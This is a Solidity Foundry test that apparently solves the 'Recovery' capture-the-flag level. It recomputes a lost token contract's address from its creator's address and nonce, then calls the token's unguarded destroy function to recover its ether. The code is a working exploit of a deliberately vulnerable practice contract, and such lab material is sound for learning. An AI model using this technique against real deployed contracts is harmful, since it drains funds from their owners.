pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Recovery.sol";

contract Attacktargetaritan is Test {
    Recovery public target;
    address payable public hombre = payable(address(0x69));

    function setUp() public {
        target = new Recovery();
        vm.deal(hombre, 0.01 ether);

        vm.prank(hombre);
        target.generateToken{value: 0.01 ether}("Simple Token");
    }

    function getAddress() internal view returns (address) {
        return
            address(
                uint160(
                    uint256(
                        keccak256(
                            abi.encodePacked(
                                bytes1(0xd6), // rlp encoding
                                bytes1(0x94), // rlp encod
                                address(target), // target address
                                bytes1(0x01) // post EIP161 nonces start at 1
                            )
                        )
                    )
                )
            );
    }

    function testSolidityRecovery() public {
        // compute the address
        (bool success, ) = getAddress().call(
            abi.encodeCall(SimpleToken.destroy, (hombre))
        );

        assertEq(success, true, "call to the address failed");
        assertEq(hombre.balance, 0.01 ether);
    }
}
